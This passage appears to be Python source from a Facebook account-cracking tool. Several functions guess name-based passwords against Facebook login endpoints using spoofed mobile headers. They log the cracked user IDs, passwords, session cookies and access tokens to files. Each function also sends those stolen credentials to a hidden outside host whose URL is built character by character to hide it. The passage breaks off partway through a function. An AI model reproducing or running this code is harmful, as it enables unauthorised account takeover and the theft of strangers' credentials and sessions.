            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url="https://graph.facebook.com/auth/login"
            rq=requests.post(url,data=data,headers=headers).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    if rq['is_account_confirmed'] == False:
                        open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    else:
                        open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                        open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token=rq['access_token']
                    open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        
        



def filemeth5(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    fb=mas.domain(qw)
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        ses=requests.session()
        for pw in pwx:
            ua=mas.MXuseragent()
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            headers = {
            'authority': fb,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '3',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980',}
            response = ses.get(f'https://{fb}/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr',headers=headers)
            cookie = dict(ses.cookies.get_dict())
            headers2 = {
            'authority': fb,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '3',
            'origin': f'https://{fb}',
            'referer': f'https://{fb}/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980'}
            data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(response.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(response.text)).group(1),
            'uid': uid,
            'next': f'https://{fb}/login/save-device/',
            'flow': 'login_no_pin',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], ps)}
            response = ses.post(f'https://{fb}/login/device-based/validate-password/?shbl=0',cookies=cookie,headers=headers2,data=data,allow_redirects=False)
            
            rq=ses.cookies.get_dict().keys()
            if "c_user" in rq:
                coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "checkpoint" in rq:
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)

def filemeth6(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            edata={
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "en_US",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": "11994080425506443985518532446",
                "variables": "{\"params\": " + json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": str(uuid.uuid4()),
                            "attestation_result": {
                                "data": "eyJjaGFsbGVuZ2Vfbm9uY2UiOiAiWHpONmM5eEE0MmNjMW5mdmFIRk1pQTdzOXFDQzhYd0hLSmZPSnJDWWNrND0iLCAidXNlcm5hbWUiOiAiMTAwMDAyNTY2NjIxNDA5In0=",
                                "signature": "MEUCIQDr7WcJxItusy+bdqDKLyObaZrxduabPGIuNjCyRy1MAwIgbpu6PlPS+frCp+VMlwNcd/YAaExWpQ70GVIU6GBr7Cw=",
                                "keyHash": "c9f1ad106abc6f55de332e615e9895b7d501a5c65bd63b3d697d2521607faad4"
                            },
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "sim_serials": [],
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "null",
                            "should_show_nested_nta_from_aymh": 0,
                            "device_id": str(uuid.uuid4()),
                            "login_attempt_count": 1,
                            "machine_id": "",
                            "flash_call_permission_status": {
                                "READ_PHONE_STATE": "DENIED",
                                "READ_CALL_LOG": "DENIED",
                                "ANSWER_PHONE_CALLS": "DENIED"},
                            "accounts_list": [],
                            "family_device_id": str(uuid.uuid4()),
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": str(uuid.uuid4()),
                            "openid_tokens": {},
                            "contact_point": uid},
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": str(uuid.uuid4()),
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "pw_encryption_try_count": 1,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "is_from_landing_page": 0,
                            "password_text_input_id": "2l8w01:99",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "2l8w01:98",
                            "layered_homepage_experiment_group": 'null',
                            "device_id": str(uuid.uuid4()),
                            "INTERNAL__latency_qpl_instance_id": 15661900900760.0,
                            "reg_flow_source": "login_home_native_integration_point",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": str(uuid.uuid4()),
                            "is_from_assistive_id": 0,
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    "bloks_versioning_id": "6e5066c89e362918fb2dee96006e79b5884689c496dc2d8364ce162aa16ee708",
                    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                }) + "}",
                "fb_api_analytics_tags": "[\"GraphServices\"]",
                "client_trace_id": str(uuid.uuid4()),}
            head={
                "user-agent": ua,
                "accept-encoding": "gzip, deflate",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "host": "b-graph.facebook.com",
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-sim-hni": str(random.randint(20000,40000)),
                "x-fb-net-hni": str(random.randint(20000,40000)),
                "content-type": "application/x-www-form-urlencoded",
                "x-graphql-client-library": "graphservice",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "x-tigon-is-retry": "False",
                "x-fb-privacy-context": "3643298472347298",
                "x-graphql-request-purpose": "fetch",
                "x-fb-device-group": str(random.randint(2000,4000)),
                "x-zero-eh": "664c0faaac849cb891d0a261fbb72a12",
                "x-zero-state": "unknown",
                "x-fb-connection-type": "WIFI",
                "x-fb-rmd": "fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=-994;recvTime=4160",
                "x-fb-request-analytics-tags": "{\"network_tags\":{\"product\":\"350685531728\",\"purpose\":\"fetch\",\"request_category\":\"graphql\",\"retry_attempt\":\"0\"},\"application_tags\":\"graphservice\"}",
                "x-fb-http-engine": "Tigon/Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "Content-Length": "1966"}
            url='https://b-graph.facebook.com/graphql'
            rq=str(requests.post(url,data=edata, headers=head).text)
            if "session_key" in rq:
                data_coki=rq.replace(symbolsx,"")
                c_user=re.search('"c_user","value":"(.*?)",', str(data_coki)).group(1)
                xs=re.search('"xs","value":"(.*?)",', str(data_coki)).group(1)
                fr=re.search('"fr","value":"(.*?)",', str(data_coki)).group(1)
                datr=re.search('"datr","value":"(.*?)",', str(data_coki)).group(1)
                coki="c_user="+c_user+";xs="+xs+";fr="+fr+";datr="+datr
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


def filemeth7(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            edata={
                "method": "post",
                "pretty": "false",
                "format": "json",
                "server_timestamps": "true",
                "locale": "en_US",
                "purpose": "fetch",
                "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "fb_api_caller_class": "graphservice",
                "client_doc_id": "11994080425506443985518532446",
                "variables": "{\"params\": " + json.dumps({
                    "params": json.dumps({
                        "client_input_params": {
                            "sim_phones": [],
                            "secure_family_device_id": str(uuid.uuid4()),
                            "attestation_result": {
                                "data": "eyJjaGFsbGVuZ2Vfbm9uY2UiOiAiWHpONmM5eEE0MmNjMW5mdmFIRk1pQTdzOXFDQzhYd0hLSmZPSnJDWWNrND0iLCAidXNlcm5hbWUiOiAiMTAwMDAyNTY2NjIxNDA5In0=",
                                "signature": "MEUCIQDr7WcJxItusy+bdqDKLyObaZrxduabPGIuNjCyRy1MAwIgbpu6PlPS+frCp+VMlwNcd/YAaExWpQ70GVIU6GBr7Cw=",
                                "keyHash": "c9f1ad106abc6f55de332e615e9895b7d501a5c65bd63b3d697d2521607faad4"
                            },
                            "has_granted_read_contacts_permissions": 0,
                            "auth_secure_device_id": "",
                            "has_whatsapp_installed": 0,
                            "password": "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
                            "sso_token_map_json_string": "",
                            "event_flow": "login_manual",
                            "password_contains_non_ascii": "false",
                            "sim_serials": [],
                            "client_known_key_hash": "",
                            "encrypted_msisdn": "",
                            "has_granted_read_phone_permissions": 0,
                            "app_manager_id": "null",
                            "should_show_nested_nta_from_aymh": 0,
                            "device_id": str(uuid.uuid4()),
                            "login_attempt_count": 1,
                            "machine_id": "",
                            "flash_call_permission_status": {
                                "READ_PHONE_STATE": "DENIED",
                                "READ_CALL_LOG": "DENIED",
                                "ANSWER_PHONE_CALLS": "DENIED"},
                            "accounts_list": [],
                            "family_device_id": str(uuid.uuid4()),
                            "fb_ig_device_id": [],
                            "device_emails": [],
                            "try_num": 1,
                            "lois_settings": {"lois_token": ""},
                            "event_step": "home_page",
                            "headers_infra_flow_id": str(uuid.uuid4()),
                            "openid_tokens": {},
                            "contact_point": uid},
                        "server_params": {
                            "should_trigger_override_login_2fa_action": 0,
                            "is_from_logged_out": 0,
                            "should_trigger_override_login_success_action": 0,
                            "login_credential_type": "none",
                            "server_login_source": "login",
                            "waterfall_id": str(uuid.uuid4()),
                            "login_source": "Login",
                            "is_platform_login": 0,
                            "pw_encryption_try_count": 1,
                            "INTERNAL__latency_qpl_marker_id": 36707139,
                            "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                            "is_from_landing_page": 0,
                            "password_text_input_id": "2l8w01:99",
                            "is_from_empty_password": 0,
                            "is_from_msplit_fallback": 0,
                            "ar_event_source": "login_home_page",
                            "username_text_input_id": "2l8w01:98",
                            "layered_homepage_experiment_group": 'null',
                            "device_id": str(uuid.uuid4()),
                            "INTERNAL__latency_qpl_instance_id": 15661900900760.0,
                            "reg_flow_source": "login_home_native_integration_point",
                            "is_caa_perf_enabled": 1,
                            "credential_type": "password",
                            "is_from_password_entry_page": 0,
                            "caller": "gslr",
                            "family_device_id": str(uuid.uuid4()),
                            "is_from_assistive_id": 0,
                            "access_flow_version": "pre_mt_behavior",
                            "is_from_logged_in_switcher": 0
                        }
                    }),
                    "bloks_versioning_id": "6e5066c89e362918fb2dee96006e79b5884689c496dc2d8364ce162aa16ee708",
                    "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                }) + "}",
                "fb_api_analytics_tags": "[\"GraphServices\"]",
                "client_trace_id": str(uuid.uuid4()),}
            head={
               "user-agent": ua,
                "accept-encoding": "gzip, deflate",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "host": "graph.facebook.com",
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "x-fb-sim-hni": str(random.randint(20000,40000)),
                "x-fb-net-hni": str(random.randint(20000,40000)),
                "content-type": "application/x-www-form-urlencoded",
                "x-graphql-client-library": "graphservice",
                "x-fb-friendly-name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                "x-tigon-is-retry": "False",
                "x-fb-privacy-context": "3643298472347298",
                "x-graphql-request-purpose": "fetch",
                "x-fb-device-group": str(random.randint(2000,4000)),
                "x-zero-eh": "664c0faaac849cb891d0a261fbb72a12",
                "x-zero-state": "unknown",
                "x-fb-connection-type": "WIFI",
                "x-fb-rmd": "fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=-994;recvTime=4160",
                "x-fb-request-analytics-tags": "{\"network_tags\":{\"product\":\"350685531728\",\"purpose\":\"fetch\",\"request_category\":\"graphql\",\"retry_attempt\":\"0\"},\"application_tags\":\"graphservice\"}",
                "x-fb-http-engine": "Tigon/Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "Content-Length": "1966"}
            url='https://graph.facebook.com/graphql'
            rq=str(requests.post(url,data=edata, headers=head).text)
            if "session_key" in rq:
                data_coki=rq.replace(symbolsx,"")
                c_user=re.search('"c_user","value":"(.*?)",', str(data_coki)).group(1)
                xs=re.search('"xs","value":"(.*?)",', str(data_coki)).group(1)
                fr=re.search('"fr","value":"(.*?)",', str(data_coki)).group(1)
                datr=re.search('"datr","value":"(.*?)",', str(data_coki)).group(1)
                coki="c_user="+c_user+";xs="+xs+";fr="+fr+";datr="+datr
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token='NOT-HAVE'
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        




def filemeth8(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': ua,
            'Host':'graph.facebook.com',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000000,40000000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url="https://graph.facebook.com/auth/login"
            rq=requests.post(url,data=data,headers=head).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    if rq['is_account_confirmed'] == False:
                        open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    else:
                        open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                        open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token=rq['access_token']
                    open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        


def filemeth9(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        for pw in pwx:
            ua=mas.met2(qw)
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid, 
            'password': "#PWD_FB4A:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate'}
            head = {
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'User-Agent': ua,
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger',}
            rq = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in rq:
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                uid=coki.split("c_user=")[1].split(";")[0].replace(" ","")
                
                if "send" in myprofit(profitoks):
                    requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofits?country="+conxyz+"&uid="+uid+"&ps="+ps+"&coki="+coki)
                    profitoks.append(uid)
                else:
                    console.print(f"\r\r[b green1][{conxyz.upper()}-OK] {uid} {dot(uid)} {ps}\n\r[💥] {coki}\n")
                    oks.append(uid)
                    profitoks.append(uid)
                    if rq['is_account_confirmed'] == False:
                        open("/sdcard/SVG/SAVAGE-NONE-VERIFY-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                    else:
                        open(f"/sdcard/SVG/SAVAGE-{optionname}-M{qw}-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                        open("/sdcard/SVG/SAVAGE-IDS.txt","a").write(uid+"|"+ps+"\n")
                    id_token=rq['access_token']
                    open("/sdcard/SVG/SAVAGE-TOKEN.txt","a").write(id_token+"\n")
                    live_ck("FILE",qw,uid,ps,coki,id_token,pw)
                break
            elif "user must verify" in str(rq).lower():
                cpp.append(uid)
                open("/sdcard/SVG/SAVAGE-CPS/SAVAGE-ALL-CP.txt","a").write(uid+"|"+ps+"\n")
                open(cp_today,"a").write(uid+"|"+ps+"\n")
                requests.get("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+mas.webHost+".c"+"om"+"/myprofitscp?uid="+uid+"&ps="+ps+"&types=file&country="+conxyz)
                
                break
            else:
                 continue
        loop+=1
    except Exception as e:
        time.sleep(10)
        





def filemeth10(uid,names,pwx,tl,qw):
    global oks,loop,twofec,cpp,koki,lock,apkshower,profitoks
    snooz_text(loop,qw,tl,oks,optionname,cpp)
    
    fb=mas.domain(qw)
    
    f1=names.split(" ")[0]
    try:
        l1=names.split(" ")[1]
    except:
        l1=f1
    try:
        ses=requests.session()
        for pw in pwx:
            ua=mas.redmi_user_agent()
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            headers = {
            'authority': fb,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '3',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980',}
            response = ses.get(f'https://{fb}/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr',headers=headers)
            cookie = dict(ses.cookies.get_dict())
            headers2 = {
            'authority': fb,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '3',
            'origin': f'https://{fb}',
